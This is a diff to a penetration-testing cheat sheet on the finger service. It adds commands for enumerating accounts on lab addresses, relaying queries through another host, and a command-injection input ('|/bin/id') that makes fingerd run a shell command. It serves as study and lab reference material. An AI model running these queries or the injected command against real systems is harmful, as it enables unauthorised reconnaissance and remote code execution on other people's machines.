@@ -74,11 +74,11 @@ man finger
 
 2. enumerate a known user. In this case root
 
-finger -s root@10.10.10.76
+# finger -s root@10.10.10.76
 
 3. Show the home directory of the user
 
-finger -sl root@10.10.10.76
+# finger -sl root@10.10.10.76
  
 ````
 #### finger Enum Script
@@ -91,7 +91,28 @@ for q in 'root' 'admin' 'user' '0' "'a b c d e f g h'" '|/bin/id';do echo "FINGE
 ````
 fingerd may respond to finger 0@<host> with information on some user accounts.
 
-finger 0@10.0.0.3
+# finger 0@10.0.0.3
 
 ````
 
+## Finger ‘a b c d e f g h’
+````
+fingerd may respond to 'a b c d e f g h'@<host> with information on all accounts.
+
+finger 'a b c d e f g h'@10.0.0.3
+````
+## Finger Bouncing
+
+````
+finger can be used to relay a request to a different host as if it were sent from that machine.
+
+# finger @10.0.0.3@10.10.10.4
+
+# finger root@10.0.0.3@10.10.10.4
+````
+## Command Execution
+````
+fingerd allows remote command execution through shell metacharacters.
+
+# finger "|/bin/id@10.0.0.3"
+````
